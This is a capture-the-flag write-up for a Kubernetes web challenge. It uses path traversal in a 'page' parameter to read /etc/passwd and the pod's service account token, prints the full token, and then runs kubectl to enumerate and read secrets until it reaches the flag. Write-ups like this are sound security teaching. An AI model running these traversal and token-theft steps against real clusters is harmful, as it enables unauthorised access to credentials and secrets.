# Whale Blog

!NOTE Some of these IP addresses/domains may be different to the ones used in the actual CTF.

This was a kubernetes challenge! As hinted by the whale. So we are given an entry point URL of http://whale-blog.duc.tf:30000/

We get a simple page with a Whale video on it, epic. If we view the source we see a reference comment thats says:

`I wonder if we will deploy this at whale-blog.duc.tf or at whale-endpoint.duc.tf`

Since the endpoint we have is whale-blog.duc.tf we can check out what the other url points to.

when we try and access through the browser we get a certificate error however if we ignore tls errors through curl with 

`curl https://whale-endpoint.duc.tf/ -k` 

We get 

```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {

  },
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {

  },
  "code": 403
}
```

In the response. If we google this error message we can see that it is the Kubernetes API, however since we are anonymous we will not be able to do anything. Let's leave this for now.

If we click the link below the video nothing seems to happen but our url changes to http://whale-blog.duc.tf:30000/?page=page1. So it seems like it is expecting something in the `page` parameter, if we check the source again we can see that the comment at the top of the webpage changes depending on what we put in the `page` parameter.

Let's see if we can change this to something arbitrary to see if this page is including this file in the page. Navigating to http://whale-blog.duc.tf:30000/?page=../../../../../../etc/passwd we get the output of the `passwd` file as a comment on the HTML page. Awesome so we have a full Local File Inclusion (LFI) and we can read any file on the server.

So given that the other IP address was the Kubernetes API we can make an educated guess that this web app is running on Kubernetes.

Researching common exploits with kubernetes when you have an LFI is to read the Kubernetes Service account token that is automounted in the pod unless explicity told not too. Let's try and read that, it is located at `/var/run/secrets/kubernetes.io/serviceaccount/token`.

So navigating to `http://whale-blog.duc.tf:30000/?page=../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token` and bingo, the output contains the base64 encoded token!

`eyJhbGciOiJSUzI1NiIsImtpZCI6InVjU19kOWZzMnFvZUkxWmZuNnZRdUEtcHctUktQSHJvN010LTZFVF94NncifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tdHo3dnAiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjQ3YTlhOTk4LTBlZjAtNDE5Mi1iNTgwLTVjZWEzNzZkNjEyZSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.nt5LO_dP556wtYCocTkegY2_hm-uTMo-2VJ2NIFqzu7k-plYN5FfOwriCNpH9AYIg_LCykZnTErs5eQCf01Ms0ybSuvzch41XiSfQwyKgVGdC-xooiqvPf0oUg1TjeaiLqyypvwDURxOS_9Hw5wG-3ew0LCNt7VTfU0sRA0B0Zx3rHCgeEBuJCAxgbmXr0FV-aUJ_w1GF0ovWNbd_l0naP4SVb5m9_wx1KabOIeFIf3gLoubEW_e6S9t2bYPuPy4uNZXDV5V4rs79rEEAfs85IQE5-Ue46PitpnEo5sWu870X4F3Q405HtyNQISUUP_tc1zFRgZ-bV-Dpf9kAPY_IQ`

Let's go ahead and download this and see what this service account can do. For this we will need the `kubectl` binary to interact with the Kubernetes API and see what we can do. Note in the following commands I have saved the above token in a file called `token` and I am specifing the server that is the Kubernetes API.

So let's see what this Service account can do by using the `can-i` command in kubectl

`kubectl --token=$(cat token) --server=https://whale-endpoint.duc.tf/ auth can-i --list`

```
Resources                                       Non-Resource URLs   Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
secrets                                         []                  []               [get list]
                                                [/api/*]            []               [get]
                                                [/api]              []               [get]
                                                [/apis/*]           []               [get]
                                                [/apis]             []               [get]
                                                [/healthz]          []               [get]
                                                [/healthz]          []               [get]
                                                [/livez]            []               [get]
                                                [/livez]            []               [get]
                                                [/openapi/*]        []               [get]
                                                [/openapi]          []               [get]
                                                [/readyz]           []               [get]
                                                [/readyz]           []               [get]
                                                [/version/]         []               [get]
                                                [/version/]         []               [get]
                                                [/version]          []               [get]
                                                [/version]          []               [get]
```

Wow so it looks like we can `get` and `list` secrets in the default namespace, lets go ahead and list the secrets.


`kubectl --token=$(cat token) --server=https://whale-endpoint.duc.tf/ get secrets`

```
default-token-tz7vp   kubernetes.io/service-account-token   3      8d
nooooo-dont-read-me   Opaque                                1      8d
```

Looks like we are on here, lets go ahead and read the `nooooo-dont-read-me` secret

`kubectl --token=$(cat token) --server=https://whale-endpoint.duc.tf/ get secrets nooooo-dont-read-me -o json`

```json
{
    "apiVersion": "v1",
    "data": {
        "so-secret-though": "RFVDVEZ7ZzAwbmllc19nb3RfdGgxc19sNHN0X3llYXJfbm93X3VfZGlkIX0K"
    },
    "kind": "Secret",
    <snip>
}
```

Theres a base64 encoded secret, simply decoding it gives us the flag!

`DUCTF{g00nies_got_th1s_l4st_year_now_u_did!}`